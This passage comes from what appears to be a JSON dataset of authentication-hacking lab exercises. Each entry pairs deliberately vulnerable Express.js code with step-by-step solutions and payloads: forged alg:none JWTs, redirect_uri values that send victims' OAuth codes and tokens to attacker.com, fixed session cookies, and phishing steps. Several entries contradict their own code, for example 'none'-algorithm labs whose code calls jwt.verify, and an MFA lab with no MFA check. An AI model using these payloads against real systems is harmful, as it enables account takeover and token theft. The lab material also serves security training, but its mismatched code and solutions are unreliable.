    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid'); } }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; const token = auth && auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username === 'admin') { res.send('Admin access granted'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Authorization: Bearer <forged_token>",
      "Modified JWT with alg:none"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration exploiting open redirect",
    "Lab Description": "The application uses OAuth for third-party login but trusts any redirect URI without validation. This enables attackers to manipulate the redirect_uri parameter to capture tokens. To solve: Abuse the redirect URI to intercept Carlos's access token and use it to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to inspect the OAuth login request and locate the redirect_uri parameter.",
      "Modify the redirect_uri to point to your controlled server (e.g., https://attacker.com/callback).",
      "Craft a phishing link with the manipulated redirect and send it to Carlos (simulate click).",
      "Capture the token from the redirected GET request to your server.",
      "Use Postman to send GET /profile with Authorization: Bearer <captured_token> to access Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; if (client_id === 'trusted-client') { res.redirect(`${redirect_uri}?token=carlos-access-token`); } else { res.status(400).send('Invalid client'); } }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'carlos-access-token') { res.send('Profile: Carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(5000);",
    "payloads": [
      "https://target.com/auth?client_id=trusted-client&redirect_uri=https://attacker.com/callback",
      "Authorization: Bearer carlos-access-token",
      "Phishing URL with redirect_uri injection"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Predictable Token Injection in OAuth Flow",
    "Lab Description": "The OAuth implementation in this application mishandles session tokens when delegating login to third-party providers. The session identifier is not regenerated upon successful login. The application accepts a session token from unauthenticated users and continues using it post-authentication. To solve: fixate Carlos's session ID prior to login, then hijack his session after he logs in using the third-party flow.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start Burp Suite and proxy the OAuth login flow; click 'Log in via OAuth Provider' and intercept the initial /auth request.",
      "Inject a predefined session token by modifying the Set-Cookie header to `sessionid=attackerSession123` before redirection occurs.",
      "Allow the OAuth flow to proceed to completion. Observe that the session identifier persists after login, confirming session fixation.",
      "Send the link to Carlos (assume controlled delivery). Once Carlos logs in using the crafted link, use the fixed session cookie `sessionid=attackerSession123` to hijack the session.",
      "Access /account page while reusing the fixed session token. The lab is solved when Carlos's profile loads."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.get('/auth', (req, res) => { const redirectUri = 'http://localhost:4000/callback'; res.redirect(`https://oauth.example.com/login?redirect_uri=${redirectUri}`); }); app.get('/callback', (req, res) => {   req.session.user = 'carlos'; res.redirect('/account'); }); app.get('/account', (req, res) => { if (req.session.user) { res.send(`Welcome back, ${req.session.user}`); } else { res.status(401).send('Unauthorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "sessionid=attackerSession123",
      "Set-Cookie: sessionid=attackerSession123; Path=/; HttpOnly",
      "OAuth redirect link with fixed session injected"
    ]
  },
  {
    "Lab scenario": "JWT Token Forgery via None Algorithm Exploit",
    "Lab Description": "This application uses JWT tokens to authenticate users but fails to verify the algorithm securely. If the algorithm field is set to 'none', the backend skips signature validation entirely. To solve: forge a JWT token for user 'carlos' by changing the algorithm to 'none' and access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT token using Burp Suite or browser dev tools during a login request.",
      "Decode the JWT using jwt.io or similar tool and observe it uses HS256 or RS256.",
      "Modify the header to set \"alg\": \"none\" and change the payload's username to \"carlos\".",
      "Remove the signature section entirely to reflect a valid none-algorithm JWT structure.",
      "Send a GET /account request with the Authorization header set to the forged token and verify Carlos\u00e2\u20ac\u2122s profile is accessible."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); req.user = payload.username; } else { req.user = jwt.verify(token, SECRET).username; } res.send(`Welcome ${req.user}`); } catch (err) { res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer [modified_none_jwt]",
      "{\"alg\":\"none\"}, payload:{\"username\":\"carlos\"}, no signature"
    ]
  },
  {
    "Lab scenario": "MFA Bypass via Password Reset Flow",
    "Lab Description": "This application's MFA enforcement fails during the password reset flow. After a password reset, users are logged in without triggering 2FA enforcement. To solve: trigger a password reset for Carlos, set a new password, then access his account page without MFA challenge.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "In Burp Suite, initiate a password reset using Carlos\u00e2\u20ac\u2122s email or username.",
      "Intercept the reset link in your email panel and extract the reset token from the query string.",
      "Use the reset token to set a new password for Carlos via POST /reset-password.",
      "Observe that the application automatically logs in the user without triggering the 2FA process.",
      "Navigate to /account while authenticated to Carlos to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); let users = [{ username: 'carlos', password: 'initial', mfa: true }]; let tokens = {}; app.post('/forgot-password', (req, res) => { const token = 'reset123'; tokens[req.body.username] = token; res.send('Reset link sent'); }); app.get('/reset-password', (req, res) => { const { token, user } = req.query; if (tokens[user] === token) { res.send(`<form method='POST'><input name='newPassword'><input type='hidden' name='username' value='${user}'><button>Submit</button></form>`); } else { res.status(403).send('Invalid token'); } }); app.post('/reset-password', (req, res) => { const { username, newPassword } = req.body; const user = users.find(u => u.username === username); if (user) { user.password = newPassword; res.send(`Welcome ${username}`); } else { res.status(400).send('User not found'); } }); app.listen(4000, () => console.log('MFA Bypass via Reset running'));",
    "payloads": [
      "/reset-password?user=carlos&token=reset123",
      "POST /reset-password {username: 'carlos', newPassword: 'newpass123'}",
      "Navigate to /account after reset (no MFA prompt)"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in API-based login",
    "Lab Description": "This lab uses JWTs to manage user sessions via a stateless REST API. The backend fails to enforce strict algorithm verification, allowing attackers to tamper with the token header and payload to bypass authentication. The application verifies tokens but trusts user-supplied algorithm types. To solve: forge a token that grants access to the admin dashboard without knowing the secret key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman or Burp Suite to intercept the token after logging in with a low-privilege user.",
      "Decode the JWT using jwt.io and observe the alg header is set to HS256 and a 'role' claim is present.",
      "Modify the alg field from HS256 to 'none', delete the signature section, and change the role claim to 'admin'.",
      "Replay the forged token in the Authorization header of a GET /admin request.",
      "Confirm access to /admin by checking for the presence of the admin dashboard interface."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'admin123') { const token = jwt.sign({ user: 'admin', role: 'admin' }, SECRET, { algorithm: 'HS256' }); return res.json({ token }); } if (username === 'guest' && password === 'guest123') { const token = jwt.sign({ user: 'guest', role: 'user' }, SECRET, { algorithm: 'HS256' }); return res.json({ token }); } res.status(401).send('Invalid login'); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.role === 'admin') { return res.send('Welcome to the admin dashboard'); } res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login redirect logic",
    "Lab Description": "This lab uses cookies to manage sessions. Upon login, the session ID is preserved if already present. An attacker can exploit this by sharing a pre-set session cookie with a victim and then logging in with that same session. To solve: fix a session with a victim, then hijack their authenticated session after they log in.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture the Set-Cookie header before logging in.",
      "Send a crafted phishing URL to the victim containing the fixed session ID as a cookie.",
      "Wait for the victim to log in using the fixed session.",
      "Reuse the same session ID cookie to access the victim's authenticated resources (e.g., /account).",
      "Verify access to the victim's account page and sensitive data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { alice: 'alice123', bob: 'bob123' }; app.get('/login', (req, res) => { const { username, password } = req.query; const sid = req.cookies.sid || Math.random().toString(36).substring(2); if (users[username] && users[username] === password) { sessions[sid] = username; res.cookie('sid', sid); return res.send(`Welcome ${username}`); } res.send('Login failed'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sid]; if (user) { return res.send(`Account page of ${user}`); } res.send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "GET /login?username=alice&password=alice123 with Cookie: sid=abc123",
      "GET /account with Cookie: sid=abc123"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect in callback endpoint",
    "Lab Description": "This lab uses a third-party OAuth provider for user authentication. The callback endpoint is vulnerable to an open redirect allowing an attacker to intercept tokens. To solve: manipulate the redirect_uri to leak the authorization code to an attacker-controlled server and use it to impersonate the victim.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to inspect the OAuth login flow and capture the authorization URL with a redirect_uri parameter.",
      "Modify redirect_uri to point to https://attacker.com/callback (your server).",
      "Send the malicious login URL to the victim.",
      "Capture the leaked authorization code on your server.",
      "Use Postman to exchange the code for an access token and call the victim's /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; try { const tokenRes = await axios.post('https://oauth.example.com/token', { code }); const userInfo = await axios.get('https://oauth.example.com/userinfo', { headers: { Authorization: `Bearer ${tokenRes.data.access_token}` } }); res.redirect(redirect_uri || '/welcome'); } catch (e) { res.status(500).send('OAuth failure'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Callback Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://example.com/oauth/authorize?client_id=abc123&redirect_uri=https://attacker.com/callback&response_type=code",
      "POST https://oauth.example.com/token with code=leaked_code",
      "Authorization: Bearer <stolen_token>"
    ]
  },
  {
    "Lab scenario": "JWT 'alg' field tampering to bypass signature validation",
    "Lab Description": "This lab's authentication system uses JWTs for session management. The server is misconfigured to trust JWTs even when the 'alg' field is set to 'none'. The application does not properly validate the integrity of the JWT. To solve: tamper with the JWT to impersonate the user 'carlos' and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the login request and capture the JWT token issued after a successful login.",
      "Send the JWT to jwt.io and decode the payload. Note the structure and the header using HS256 algorithm.",
      "Manually modify the header to {\"alg\": \"none\"} and change the payload's username to 'carlos'. Remove the signature portion of the JWT.",
      "Send the tampered token using Burp Repeater in the Authorization header: Bearer [modified-token]",
      "Observe if you gain access to Carlos\u00e2\u20ac\u2122s account page, confirming the bypass."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'supersecret' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, 'verysecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const user = decoded.payload.username; return res.send(`Welcome to ${user}'s account.`); } try { const verified = jwt.verify(token, 'verysecret'); return res.send(`Welcome to ${verified.username}'s account.`); } catch { return res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Header: {\"alg\": \"none\"}, Payload: {\"username\":\"carlos\"}, Signature: (empty)",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri",
    "Lab Description": "This lab has a misconfigured OAuth 2.0 implementation that accepts unvalidated redirect_uris. An attacker can manipulate the redirect flow to obtain a valid authorization code for another user. To solve: steal Carlos's token via redirect_uri manipulation and use it to access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to initiate an OAuth flow using the lab\u00e2\u20ac\u2122s /oauth/authorize endpoint and capture the redirect with code.",
      "Change the redirect_uri parameter to a malicious URL under your control and resend the request. The server does not validate it properly.",
      "Send Carlos a phishing link that initiates the OAuth flow and redirects the response to your listener server.",
      "Capture the authorization code in your listener server logs. Exchange it for an access token using /oauth/token.",
      "Use this token in the Authorization header to access Carlos\u00e2\u20ac\u2122s account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode-carlos'; const redirect = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(redirect); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode-carlos') { res.json({ access_token: 'token-carlos' }); } else { res.status(400).send('Invalid code'); } }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') return res.send('Carlos Account Data'); return res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable-app.com/oauth/authorize?client_id=xyz&redirect_uri=https://attacker.com/capture&state=1234",
      "POST /oauth/token {\"code\":\"authcode-carlos\"}",
      "Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation through predictable session ID generation",
    "Lab Description": "This lab\u00e2\u20ac\u2122s login system accepts user-supplied session IDs, and the session ID generation is weak and predictable. The application reuses the session ID if set before login. To solve: fix a known session ID before Carlos logs in and hijack his session afterward.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using OWASP ZAP, intercept the request to /login and observe the Set-Cookie response header. Note the session ID format (e.g., sess-XXXX).",
      "Send a request to /login with a crafted Cookie header: sessionid=sess-9999 and credentials of your own account. Confirm that the session ID is reused.",
      "Logout and clear your session. Send Carlos a phishing link that sets the sessionid to sess-9999 via HTTP response injection.",
      "Wait until Carlos logs in using that session. Use Burp to send a GET /account with Cookie: sessionid=sess-9999.",
      "Observe if Carlos\u00e2\u20ac\u2122s account data is returned, confirming successful session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid || `sess-${Math.floor(Math.random() * 10000)}`; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); sessions[sid] = user.username; res.cookie('sessionid', sid); res.send('Logged in'); }); app.get('/account', (req, res) => { const sid = req.cookies.sessionid; const username = sessions[sid]; if (username === 'carlos') return res.send('Welcome Carlos'); res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: sessionid=sess-9999 before login",
      "Phishing link using <meta http-equiv='Set-Cookie' content='sessionid=sess-9999'>",
      "GET /account with Cookie: sessionid=sess-9999"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Login Without Session Renewal",
    "Lab Description": "This lab demonstrates a session fixation vulnerability in which the session ID remains unchanged after a successful login. The application does not regenerate the session identifier during authentication. To solve: Fixate a session on the victim and log in as Carlos by reusing the same session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture a session cookie issued to you before login.",
      "Send the session cookie to the victim using a reflected XSS or phishing attack (assume phishing succeeded for this lab).",
      "Have the victim log in with their credentials using the pre-fixed session.",
      "Reuse the same session cookie in your browser or Burp to gain authenticated access.",
      "Access /account/carlos to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'secret123', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); req.session.user = username; res.redirect('/account'); }); app.get('/account', (req, res) => { if (!req.session.user) return res.status(401).send('Not logged in'); res.send('Welcome ' + req.session.user); }); app.listen(3000);",
    "payloads": [
      "Pre-login session cookie: sessionid=abc123; reused after victim login",
      "Phished login page link with fixed session",
      "Manual reuse of session: document.cookie='sessionid=abc123'"
    ]
  },
  {
    "Lab scenario": "JWT Signature Forgery via Error Leak in Token Validation",
    "Lab Description": "The backend uses JWTs for session management, but it discloses the secret key via verbose stack traces when given a malformed token. The application fails to suppress internal verification errors. To solve: Forge a JWT as Carlos and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a malformed JWT using Burp Repeater with an invalid signature and capture the verbose error message.",
      "Extract the hardcoded secret key from the leaked error.",
      "Craft a new JWT using HS256 algorithm and set payload { \"username\": \"carlos\" }.",
      "Sign the JWT using the recovered secret and insert it in the Authorization header.",
      "Send a GET request to /profile with the forged token to verify Carlos\u00e2\u20ac\u2122s access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.get('/profile', (req, res) => { try { const token = req.headers['authorization'].split(' ')[1]; const decoded = jwt.verify(token, secret); if (decoded.username === 'carlos') return res.send('Welcome Carlos'); res.send('Access denied'); } catch (e) { res.status(500).send(e.stack); } }); app.listen(3000);",
    "payloads": [
      "JWT with 'alg':'HS256', payload:{'username':'carlos'}, signed using 'supersecretkey'",
      "Malformed token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..invalidsig",
      "Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "Open Redirect in OAuth Flow",
    "Lab Description": "This OAuth-based login mechanism fails to properly validate the redirect_uri parameter. The application allows an arbitrary domain to receive tokens. To solve: Manipulate the redirect URI to capture Carlos\u00e2\u20ac\u2122s OAuth code, then exchange it for an access token and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to intercept the OAuth login request and modify the redirect_uri to your malicious server endpoint (e.g., https://attacker.net/callback).",
      "Send the link to the victim (Carlos) via phishing to trick him into logging in.",
      "Capture the code parameter received at your server from the victim's login.",
      "Exchange the OAuth code at the /oauth/token endpoint using a valid client_id to obtain an access token.",
      "Use the access token to request /user/profile and confirm Carlos\u00e2\u20ac\u2122s identity."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id, response_type } = req.query; if (response_type !== 'code') return res.status(400).send('Invalid response_type'); const code = 'abc123';  return res.redirect(redirect_uri + '?code=' + code); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'abc123') return res.json({ access_token: 'token_carlos' }); res.status(400).send('Invalid code'); }); app.get('/user/profile', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer token_carlos') return res.send('Carlos Profile'); res.status(401).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "https://vulnerable.site/auth?redirect_uri=https://attacker.net/callback&client_id=trusted&response_type=code",
      "POST /oauth/token { code: abc123 }",
      "Authorization: Bearer token_carlos"
    ]
  },
  {
    "Lab scenario": "Session Fixation in cookie-based login system",
    "Lab Description": "The application uses session tokens to track users post-login but does not regenerate them after successful authentication. This allows attackers to fixate a known session ID. The application accepts a session cookie pre-authentication and reuses it post-login without renewal. To solve: force a victim to authenticate under an attacker-supplied session and hijack their session to access their profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GET /login request and capture the unauthenticated session cookie (sessionid).",
      "2. Share this sessionid with the victim and craft a phishing link that sets this cookie in the victim's browser using JavaScript or an open redirect.",
      "3. Instruct the victim to log in normally with the fixed session.",
      "4. Wait until the victim has authenticated using the fixated session.",
      "5. Reuse the same sessionid in your browser and access /my-account to gain unauthorized access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; const sessions = {}; app.use((req, res, next) => { if (!req.cookies.sessionid) { const sid = Math.random().toString(36).substr(2); res.cookie('sessionid', sid); sessions[sid] = { authenticated: false }; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const session = sessions[req.cookies.sessionid]; const user = users.find(u => u.username === username && u.password === password); if (user && session) { session.authenticated = true; session.username = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.sessionid]; if (session && session.authenticated) { res.send(`Welcome ${session.username}`); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
    "payloads": [
      "document.cookie = 'sessionid=attackerknownvalue; path=/';",
      "https://victim-site.com/login?sessionid=attackerknownvalue",
      "Manually inject cookie in browser: sessionid=attackerknownvalue"
    ]
  },
  {
    "Lab scenario": "JWT tampering using 'none' algorithm",
    "Lab Description": "This application uses JWTs for authentication. However, it incorrectly trusts tokens with the 'alg' header set to 'none' and does not verify the signature. This allows an attacker to forge arbitrary tokens. To solve: craft a JWT granting access to the 'admin' user and access their profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Log in to the application using your own credentials and intercept the JWT token using Burp.",
      "2. Decode the JWT using jwt.io or similar tool and note the structure of the header, payload, and signature.",
      "3. Modify the header to use 'alg':'none' and change the payload's 'user':'admin'.",
      "4. Remove the signature entirely and base64url-encode the new token.",
      "5. Replace the original Authorization Bearer token with your forged JWT and access /admin-dashboard to verify the attack worked."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'secret', role: 'admin' }, { username: 'user', password: 'pass', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ user: username, role: user.role }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('Forbidden'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'supersecret'); if (decoded.role === 'admin') { res.send('Welcome admin!'); } else { res.status(403).send('Access denied'); } } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"user\":\"admin\",\"role\":\"admin\"}",
      "Token: base64url(header).base64url(payload)."
    ]
  },
  {
    "Lab scenario": "OAuth open redirect in redirect_uri parameter",
    "Lab Description": "This OAuth implementation fails to validate the redirect_uri properly during authorization. Attackers can manipulate the redirect_uri to hijack authorization codes. The application whitelists any subdomain and doesn't enforce exact matching. To solve: intercept a user's OAuth flow and steal the authorization code to log in as them.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Initiate an OAuth login flow and observe the authorization URL, especially the redirect_uri.",
      "2. Register a subdomain like attacker.victim-oauth.com and setup a web server to receive redirected codes.",
      "3. Modify the redirect_uri to point to your malicious subdomain and trick the victim into clicking the link.",
      "4. Capture the authorization code from your server logs once the victim logs in and gets redirected.",
      "5. Exchange the stolen code for an access token and use it to call /user-info or /account with the victim's token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const code = 'authcode123'; res.redirect(`${redirect_uri}?code=${code}`); }); app.get('/callback', (req, res) => { const { code } = req.query; axios.post('https://oauth-provider/token', { code }).then(response => { res.send('Access granted: ' + response.data.token); }).catch(err => res.status(500).send('Error exchanging code')); }); app.listen(4000);",
    "payloads": [
      "https://auth.victim.com/auth?redirect_uri=https://attacker.victim.com/callback",
      "https://auth.victim.com/auth?redirect_uri=https://attacker.com",
      "Capture: GET /callback?code=xyz123",
      "POST /token { code: 'xyz123' }"
    ]
  },
  {
    "Lab scenario": "Session Fixation in OAuth Authorization Flow",
    "Lab Description": "This lab demonstrates a session fixation vulnerability during OAuth login using the Authorization Code grant type. The application mistakenly trusts the session cookie issued before OAuth verification is complete. The application fails to bind the session cookie to the OAuth authorization code flow. To solve: exploit the session fixation to log in as Carlos by abusing the OAuth login flow.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the login request and initiate OAuth login using your own account. Note the session cookie set during this step.",
      "Capture the redirection URL after clicking 'Log in with OAuth' and note the OAuth state and session values.",
      "Craft a phishing link containing your own session ID and send it to the victim. Use an HTML-based delivery payload with a fake login prompt.",
      "Once Carlos clicks the link and authorizes via OAuth, your session is upgraded to Carlos's identity due to session fixation.",
      "Verify the session by visiting /my-account with your original session cookie still intact."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'sessionFix', resave: false, saveUninitialized: true })); app.get('/auth/login', (req, res) => { req.session.oauth_initiated = true; res.redirect(`https://authserver.com/oauth?state=${req.session.id}`); }); app.get('/auth/callback', (req, res) => { const user = req.query.user; if (req.session.oauth_initiated) { req.session.user = user; res.redirect('/my-account'); } else { res.status(403).send('OAuth flow not initiated.'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(401).send('Not authenticated'); }); app.listen(4000);",
    "payloads": [
      "https://target-app.com/auth/login?session=attackerSessionID",
      "Phishing page with <meta http-equiv='refresh'> to redirect to OAuth URL with preset session cookie",
      "https://target-app.com/my-account (with pre-authenticated attacker cookie)"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in GraphQL Authorization Header",
    "Lab Description": "This lab simulates an insecure JWT implementation within a GraphQL API that incorrectly allows tokens using the 'none' algorithm. The backend uses the Authorization Bearer token to authenticate users but skips verification if the algorithm is set to 'none'. To solve: forge a JWT with 'alg: none' and impersonate Carlos to access his profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to inspect the GraphQL endpoint at /graphql and issue a query with your valid token.",
      "Decode the JWT using jwt.io or a similar tool and observe the payload and headers.",
      "Manually craft a token with 'alg' set to 'none' and payload set to { \"username\": \"carlos\" } without signing.",
      "Replace the Authorization header with 'Bearer [forged_token]' and resend the GraphQL query to fetch user data.",
      "Verify access by fetching Carlos's profile details or settings using a GraphQL query like { me { username, email } }."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/graphql', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'supersecret'); if (decoded.username) res.json({ data: { me: { username: decoded.username } } }); else res.status(401).send('Unauthorized'); } catch (err) { res.status(401).send('JWT Error'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{ \"query\": \"{ me { username email } }\" }",
      "Authorization: Bearer [forged JWT with alg: none]"
    ]
  },
  {
    "Lab scenario": "MFA Bypass via Debug Parameter Injection in REST API",
